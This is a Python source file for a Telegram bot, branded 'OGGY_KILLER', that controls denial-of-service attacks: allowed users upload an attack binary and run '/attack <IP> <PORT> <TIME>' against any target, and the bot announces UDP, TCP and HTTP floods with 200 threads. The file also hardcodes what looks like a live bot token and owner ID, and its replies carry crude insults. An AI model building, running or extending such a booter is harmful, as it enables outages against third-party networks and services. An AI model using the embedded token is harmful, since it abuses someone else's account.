#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import threading
import signal
import time
import json
from datetime import datetime
from pathlib import Path

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
except ImportError:
    print("[!] Install python-telegram-bot: pip install python-telegram-bot==20.0")
    sys.exit(1)

# ==================== CONFIG ====================
BOT_TOKEN = "8736196701:AAEMP3Hw8cNZ4lzHBT3NXXJEK12JoyrwplE"   # Your token
OWNER_ID = 8477195695                                         # Owner ID
ALLOWED_USERS_FILE = "allowed_users.json"
BINARY_NAME = "oggy"
BINARY_PATH = f"./{BINARY_NAME}"
# =================================================

# Global variables
attack_thread = None
attack_running = False
current_attack_info = {}
allowed_users = set()

# ---------- Allowed Users Management ----------
def load_allowed_users():
    global allowed_users
    if os.path.exists(ALLOWED_USERS_FILE):
        try:
            with open(ALLOWED_USERS_FILE, 'r') as f:
                data = json.load(f)
                allowed_users = set(data.get("users", []))
        except:
            allowed_users = set()
    else:
        allowed_users = set()
    allowed_users.add(str(OWNER_ID))
    save_allowed_users()

def save_allowed_users():
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump({"users": list(allowed_users)}, f)

def is_allowed(user_id):
    return str(user_id) in allowed_users

def is_owner(user_id):
    return str(user_id) == str(OWNER_ID)

# ---------- Binary Helpers ----------
def check_binary_exists():
    path = Path(BINARY_PATH)
    if not path.exists():
        return False, "Binary file not found"
    if not os.access(BINARY_PATH, os.X_OK):
        return False, "Binary exists but not executable"
    return True, "Binary ready"

def test_binary():
    try:
        result = subprocess.run([BINARY_PATH], capture_output=True, text=True, timeout=5)
        if "Usage:" in result.stdout or "Usage:" in result.stderr:
            return True, "Binary working (shows usage)"
        else:
            return False, "Binary ran but no usage - may still work"
    except Exception as e:
        return False, f"Test failed: {e}"

def run_attack(ip, port, time_sec):
    global attack_running
    attack_running = True
    cmd = [BINARY_PATH, ip, str(port), str(time_sec)]
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        process.wait()
        attack_running = False
        return True
    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")
        attack_running = False
        return False

# ---------- Telegram Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await update.message.reply_text("❌ CHUMT KA GULAM, tu allowed nahi hai! Owner se contact kar.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📤 Upload Binary", callback_data='upload')],
        [InlineKeyboardButton("🎯 Attack Now", callback_data='attack')],
        [InlineKeyboardButton("📊 Status", callback_data='status')],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data='stop')],
        [InlineKeyboardButton("👥 Users", callback_data='users')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"😈🔥 **OGGY_KILLER ULTIMATE BOT** 🔥😈\n\n"
        f"CHUMT KE PYASA, welcome!\n"
        f"Owner: @OGGY (ID: {OWNER_ID})\n"
        f"Your ID: `{user_id}`\n\n"
        f"**Commands:**\n"
        f"/upload - Send binary file\n"
        f"/attack <IP> <PORT> <TIME> - Start attack\n"
        f"/status - Check binary & attack status\n"
        f"/stop - Stop current attack\n"
        f"/adduser <ID> - (Owner only) Add user\n"
        f"/removeuser <ID> - (Owner only) Remove user\n"
        f"/listusers - Show allowed users\n"
        f"/help - Show help\n\n"
        f"👿 Developer: @OGGY",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    if not update.message.document:
        await update.message.reply_text("❌ Koi file attach nahi kiya! /upload command ke sath file bhejo.")
        return
    
    document = update.message.document
    file_size = document.file_size
    
    if file_size > 10 * 1024 * 1024:
        await update.message.reply_text("❌ File 10 MB se badi hai!")
        return
    
    try:
        file = await document.get_file()
        await file.download_to_drive(BINARY_PATH)
        os.chmod(BINARY_PATH, 0o755)
        
        exists, msg = check_binary_exists()
        if not exists:
            await update.message.reply_text(f"❌ Upload failed: {msg}")
            return
        
        test_ok, test_msg = test_binary()
        if test_ok:
            await update.message.reply_text(
                f"✅ **Binary uploaded & ready!**\n\n"
                f"📁 File: `{BINARY_PATH}`\n"
                f"🔧 Permissions: Executable\n"
                f"🧪 Test: {test_msg}\n\n"
                f"🔥 Use `/attack <IP> <PORT> <TIME>`",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                f"⚠️ Binary uploaded but test: {test_msg}\n"
                f"Still you can try `/attack`.",
                parse_mode='Markdown'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {e}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_thread, attack_running, current_attack_info
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    exists, msg = check_binary_exists()
    if not exists:
        await update.message.reply_text(f"❌ Binary not ready: {msg}\nUpload karo pehle /upload se.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ **Usage:** `/attack <IP> <PORT> <TIME>`\n"
            "Example: `/attack 192.168.1.1 80 60`",
            parse_mode='Markdown'
        )
        return
    
    ip = args[0]
    port = int(args[1])
    time_sec = int(args[2])
    
    if attack_running:
        await update.message.reply_text("⚠️ Attack already running! Use /stop first.")
        return
    
    current_attack_info = {
        'ip': ip,
        'port': port,
        'time': time_sec,
        'started': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'started_by': user_id
    }
    
    await update.message.reply_text(
        f"🔥 **ATTACK LAUNCHED!** 🔥\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Duration: `{time_sec} sec`\n"
        f"💀 Threads: `200` (UDP+TCP+HTTP)\n"
        f"👤 Started by: `{user_id}`\n"
        f"👿 OGGY says: CHUMT KA DARINDA ne shuru kar diya!\n\n"
        f"Use /status to monitor.",
        parse_mode='Markdown'
    )
    
    attack_thread = threading.Thread(target=run_attack, args=(ip, port, time_sec))
    attack_thread.daemon = True
    attack_thread.start()

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    exists, msg = check_binary_exists()
    binary_status = "✅ Ready" if exists else f"❌ {msg}"
    
    if attack_running:
        info = current_attack_info
        attack_status = (
            f"🔴 **RUNNING**\n"
            f"🎯 {info.get('ip', 'N/A')}:{info.get('port', 'N/A')}\n"
            f"⏱️ {info.get('time', 'N/A')} sec\n"
            f"🕒 Started: {info.get('started', 'N/A')}\n"
            f"👤 By: {info.get('started_by', 'N/A')}"
        )
    else:
        attack_status = "🟢 IDLE"
    
    await update.message.reply_text(
        f"📊 **OGGY STATUS**\n\n"
        f"**Binary:** {binary_status}\n"
        f"**Attack:** {attack_status}\n\n"
        f"Commands: /upload, /attack, /stop, /adduser, /listusers",
        parse_mode='Markdown'
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    if attack_running:
        os.kill(os.getpid(), signal.SIGINT)
        attack_running = False
        await update.message.reply_text(
            "🛑 **ATTACK STOPPED!** 🛑\n\n"
            "CHUMT KA GULAM bach gaya! 😂"
        )
    else:
        await update.message.reply_text("⚠️ Koi attack nahi chal raha.")

async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_owner(user_id):
        await update.message.reply_text("❌ Sirf owner (OGGY) hi user add kar sakta hai!")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❌ Usage: `/adduser <USER_ID>`\nExample: `/adduser 123456789`", parse_mode='Markdown')
        return
    
    new_id = args[0]
    if new_id in allowed_users:
        await update.message.reply_text(f"⚠️ User `{new_id}` already in allowed list.", parse_mode='Markdown')
        return
    
    allowed_users.add(new_id)
    save_allowed_users()
    await update.message.reply_text(f"✅ User `{new_id}` added successfully!\nTotal allowed users: {len(allowed_users)}", parse_mode='Markdown')

async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_owner(user_id):
        await update.message.reply_text("❌ Sirf owner hi user remove kar sakta hai!")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❌ Usage: `/removeuser <USER_ID>`", parse_mode='Markdown')
        return
    
    rem_id = args[0]
    if rem_id == str(OWNER_ID):
        await update.message.reply_text("❌ Owner ko remove nahi kar sakte!")
        return
    if rem_id not in allowed_users:
        await update.message.reply_text(f"⚠️ User `{rem_id}` allowed list mein nahi hai.", parse_mode='Markdown')
        return
    
    allowed_users.remove(rem_id)
    save_allowed_users()
    await update.message.reply_text(f"✅ User `{rem_id}` removed successfully!\nRemaining: {len(allowed_users)}", parse_mode='Markdown')

async def listusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    if not allowed_users:
        await update.message.reply_text("📭 No allowed users (except owner).")
        return
    
    users_list = "\n".join([f"• `{uid}`" for uid in allowed_users])
    await update.message.reply_text(
        f"👥 **Allowed Users** ({len(allowed_users)}):\n\n{users_list}\n\n"
        f"Owner: `{OWNER_ID}`",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    await update.message.reply_text(
        f"🤖 **OGGY_KILLER BOT HELP**\n\n"
        f"**Commands:**\n"
        f"`/start` - Main menu\n"
        f"`/upload` - Send binary file (attach)\n"
        f"`/attack <IP> <PORT> <TIME>` - Launch attack\n"
        f"`/status` - Check binary & attack status\n"
        f"`/stop` - Stop current attack\n"
        f"`/adduser <ID>` - (Owner) Add user\n"
        f"`/removeuser <ID>` - (Owner) Remove user\n"
        f"`/listusers` - Show allowed users\n"
        f"`/help` - This help\n\n"
        f"**Example:**\n"
        f"1. /upload (attach file)\n"
        f"2. /attack 1.2.3.4 80 30\n\n"
        f"👿 Developer: @OGGY",
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    if not is_allowed(user_id):
        await query.edit_message_text("❌ Tu allowed nahi hai!")
        return
    
    if query.data == 'upload':
        await query.edit_message_text("📤 Send the binary file as a document with /upload command.")
    elif query.data == 'attack':
        await query.edit_message_text("🎯 Use /attack <IP> <PORT> <TIME>")
    elif query.data == 'status':
        await status(update, context)
    elif query.data == 'stop':
        await stop(update, context)
    elif query.data == 'users':
        await listusers(update, context)
    elif query.data == 'help':
        await help_command(update, context)

# ---------- Main ----------
def main():
    print("🔥 OGGY_KILLER ULTIMATE BOT STARTING...")
    print(f"🤖 Owner ID: {OWNER_ID}")
    print(f"📁 Binary path: {BINARY_PATH}")
    load_allowed_users()
    print(f"👥 Allowed users loaded: {len(allowed_users)}")
    print("💀 CHUMT KA DARINDA ready!\n")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("upload", upload_handler))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("adduser", adduser))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("listusers", listusers))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 Bot running... Press Ctrl+C to stop")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()